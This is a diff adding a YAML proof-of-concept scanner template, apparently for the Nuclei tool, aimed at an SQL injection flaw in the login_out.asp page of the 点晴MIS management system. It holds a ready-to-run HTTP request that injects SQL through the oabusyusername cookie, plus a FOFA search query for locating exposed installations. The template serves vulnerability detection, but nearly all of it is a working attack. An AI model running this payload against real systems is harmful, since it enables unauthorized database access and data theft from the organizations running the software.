@@ -1,0 +1,25 @@
+id: poc-yg2usvcheof0cp2f
+info:
+  name: 点晴MIS管理信息系统 login_out.asp 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yg2usvcheof0cp2f'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yg2usvcheof0cp2f
+    fofa: title="点晴MIS管理信息系统"
+http:
+- raw:
+  - 'GET /login_out.asp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
+
+    Cookie: oabusyusername=1''+and+@@VERSION>1--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
